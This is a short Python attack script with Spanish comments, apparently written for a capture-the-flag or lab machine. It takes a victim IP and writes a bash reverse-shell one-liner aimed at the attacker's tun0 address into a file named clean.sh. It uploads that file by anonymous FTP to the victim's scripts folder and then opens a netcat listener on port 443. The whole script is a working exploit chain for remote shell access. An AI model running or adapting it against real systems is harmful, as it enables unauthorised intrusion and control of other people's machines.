import time
from ftplib import FTP
import os
import netifaces

print()
print("  _____  _____                   ")
print(" |      |     /     /\    |\   |     ")
print(" |___   |____/     /__\   | \  |    ")
print(" |      |    \    /    \  |  \ |       ")
print(" |      |     \  /      \ |   \| ") 
 
ip_vic = input("[+] IP de la víctima: ")

def obt_ip():
    dire = netifaces.ifaddresses('tun0')

# Verificar si se encontraron direcciones IP para la interfaz 'tun0'
    if netifaces.AF_INET in dire:
        # Obtener la primera dirección IP encontrada en la interfaz 'tun0'
        dire_ip = dire[netifaces.AF_INET][0]['addr']
        print("[+] La dirección IP de la interfaz tun0 es:", dire_ip)
    else:
        print("[!] No se encontraron direcciones IP para la interfaz tun0")
    return dire_ip

# Llamada a la función para obtener la dirección IP de tun0
tun0 = obt_ip()

time.sleep(2)

# Crear el archivo clean.sh

with open("clean.sh", "a") as archivo:
    archivo.write("#!/bin/bash\n\nbash -i >& /dev/tcp/" + tun0 + "/443 0>&1\n")

# Comprobamos la existencia del archivo clean.sh:

if os.path.isfile("clean.sh"):
    print("[+] Se ha creado correctamente el archivo clean.sh malicioso, listo para subir a la víctima")
else:
    print("[!] Hubo un error en el proceso")
    exit(1)


# Subir el archivo al servidor FTP:

def up_file_server_ftp(server, local_file, remote_file):
    try:
        with FTP(server) as ftp:
            ftp.login()
            with open(local_file, 'rb') as archivo:
                ftp.storbinary(f'STOR {remote_file}', archivo)
            print('[+] Archivo subido exitosamente al servidor FTP.')
            os.remove('clean.sh')
    except Exception as e:
        print(f'[!] Error al subir el archivo al servidor FTP: {e}')


# Configurar los parámetros de conexión y archivos
server_ftp = ip_vic
local_file = 'clean.sh'
remote_file = 'scripts/clean.sh'

# Llamar a la función para subir el archivo
up_file_server_ftp(server_ftp, local_file, remote_file)

# Nos ponemos en escucha con netcat:

def ini_listen_port(port):

    try:
        output = os.system(f'nc -nlvp {port}')
        print(f"[+] Escucha en el puerto {port} iniciada correctamente.")
        print(output)
    except:
        print(f"[!] Error al iniciar la escucha en el puerto {port}")

ini_listen_port(443)
